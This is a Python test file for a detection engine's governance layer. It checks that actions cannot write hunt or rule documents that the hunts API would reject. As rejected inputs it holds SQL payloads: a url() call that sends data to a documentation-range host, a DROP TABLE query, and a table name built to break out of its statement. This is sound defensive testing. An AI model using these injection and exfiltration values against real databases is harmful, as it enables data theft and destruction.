#  Project:      dfe-engine
#  File:         tests/governance/test_action_hunt_documents.py
#  Purpose:      An action may not leave a hunt or rule document the hunts API would refuse
#  Language:     Python
#
#  License:      BUSL-1.1
#  Copyright:    (c) 2026 HYPERI PTY LIMITED
"""Actions write hunt and rule documents the hunt runner compiles straight off the repo.

An action can set any path on a document, so without a check it could point a hunt
at ``url(...)``, give it a ``query`` of ``DROP TABLE``, or rename a rule's source
into a statement. The document the action leaves is validated as the hunts API
validates one, and refused with the validator's message; nothing is written. Real
local gitops repo, no mocks. The address below is in the documentation range
(RFC 5737).
"""

import pytest

from dfe_engine.gitcrud import GitCrud, ResourceNotFoundError, default_registry
from dfe_engine.gitops.repo import GitopsRepo
from dfe_engine.governance import ActionDef, ActionStore, VarChange

EXFIL = "url('http://203.0.113.9/x', 'JSONEachRow')"

HUNT = {
    "display_name": "Certutil Abuse",
    "cron": "*/5 * * * *",
    "log_buffer": 60,
    "customers": ["org_a"],
    "global_source_table_name": "dfe.main",
    "global_target_table_name": "dfe.detection",
    "rules": [{"rule_name": "certutil"}],
}

RULE = {
    "rule_id": "certutil",
    "name": "Certutil",
    "severity": "high",
    "source_db": "dfe",
    "source_table": "main",
    "where_clause": "process_name = 'certutil.exe'",
}


@pytest.fixture
def crud(tmp_path):
    crud = GitCrud(GitopsRepo(local_path=str(tmp_path / "deploy"), push=False), default_registry())
    crud.put("hunts", "windows_hunt", dict(HUNT), actor="admin")
    crud.put("rules", "certutil", dict(RULE), actor="admin")
    return crud


@pytest.fixture
def store(crud):
    return ActionStore(crud)


def _action(*changes: tuple[str, str, str, object]) -> ActionDef:
    return ActionDef(
        name="tune",
        description="x",
        required_action="action:invoke:tune",
        changes=[VarChange(cls=c, name=n, path=p, value=v) for c, n, p, v in changes],
    )


REFUSED = {
    "hunt source a table function": (
        ("hunts", "windows_hunt", "global_source_table_name", EXFIL),
        "is not a table name",
    ),
    "hunt target a table function": (
        ("hunts", "windows_hunt", "global_target_table_name", f"FUNCTION {EXFIL}"),
        "is not a table name",
    ),
    "hunt query that drops a table": (
        ("hunts", "windows_hunt", "query", "DROP TABLE dfe.main"),
        "Invalid 'query'",
    ),
    "hunt query that calls out": (
        ("hunts", "windows_hunt", "query", f"INSERT INTO dfe.detection SELECT * FROM {EXFIL}"),
        "may not call url()",
    ),
    "hunt with no customers": (("hunts", "windows_hunt", "customers", []), "Customers list"),
    "rule source into a statement": (
        ("rules", "certutil", "source_table", "main) -- x"),
        "is not a table name",
    ),
    "rule database a table function": (
        ("rules", "certutil", "source_db", EXFIL),
        "is not a table name",
    ),
}


@pytest.mark.parametrize(("change", "message"), REFUSED.values(), ids=list(REFUSED))
def test_an_action_that_breaks_a_document_is_refused_and_writes_nothing(
    store, crud, change, message
):
    cls, name, _, _ = change
    before = crud.get(cls, name)
    store.save(_action(change), actor="admin")

    with pytest.raises(ValueError, match=message) as caught:
        store.invoke("tune", actor="bob")

    assert str(caught.value).startswith(f"{cls}/{name}: ")
    assert crud.get(cls, name) == before


@pytest.mark.parametrize(("change", "message"), REFUSED.values(), ids=list(REFUSED))
def test_a_dry_run_refuses_it_too(store, change, message):
    store.save(_action(change), actor="admin")

    with pytest.raises(ValueError, match=message):
        store.invoke("tune", actor="bob", dry_run=True)


def test_a_preview_lists_every_refused_document(store):
    action = _action(
        ("hunts", "windows_hunt", "global_source_table_name", EXFIL),
        ("rules", "certutil", "source_table", "main) -- x"),
    )

    _, errors = store.preview(action)

    assert [error.split(":", 1)[0] for error in errors] == ["hunts/windows_hunt", "rules/certutil"]
    assert all("is not a table name" in error for error in errors)


@pytest.mark.parametrize(
    "change",
    [
        ("hunts", "windows_hunt", "cron", "*/15 * * * *"),
        ("hunts", "windows_hunt", "global_source_table_name", "dfe.cisco-ios"),
        ("hunts", "windows_hunt", "query", "INSERT INTO dfe.detection SELECT * FROM dfe.main"),
        ("rules", "certutil", "source_table", "cisco-ios"),
        ("rules", "certutil", "severity", "critical"),
    ],
    ids=["cron", "hyphenated source", "insert select query", "rule source", "rule severity"],
)
def test_an_action_that_leaves_a_valid_document_still_writes(store, crud, change):
    cls, name, path, value = change
    store.save(_action(change), actor="admin")

    result = store.invoke("tune", actor="bob")

    assert result.changed is True
    assert crud.get(cls, name)[path] == value


def test_a_hunt_naming_its_rules_bare_is_validated_as_the_api_writes_it(store, crud):
    crud.put("hunts", "windows_hunt", {**HUNT, "rules": ["certutil"]}, actor="admin")
    store.save(_action(("hunts", "windows_hunt", "cron", "*/15 * * * *")), actor="admin")

    assert store.invoke("tune", actor="bob").changed is True
    assert crud.get("hunts", "windows_hunt")["rules"] == ["certutil"]


def test_a_hunt_document_of_another_shape_is_refused_not_crashed(store, crud):
    store.save(_action(("hunts", "windows_hunt", "rules", [7])), actor="admin")

    with pytest.raises(ValueError, match="not a hunts document the hunts API writes"):
        store.invoke("tune", actor="bob")


def test_an_action_creating_a_hunt_is_held_to_the_same_validation(store, crud):
    store.save(_action(("hunts", "new_hunt", "global_source_table_name", "dfe.main")), "admin")

    with pytest.raises(ValueError, match="log_buffer"):
        store.invoke("tune", actor="bob")
    with pytest.raises(ResourceNotFoundError):
        crud.get("hunts", "new_hunt")


def test_other_classes_are_not_checked_as_hunts(store, crud):
    store.save(
        _action(("helmvars", "receiver-default", "keda.maxReplicas", 6)),
        actor="admin",
    )

    assert store.invoke("tune", actor="bob").changed is True
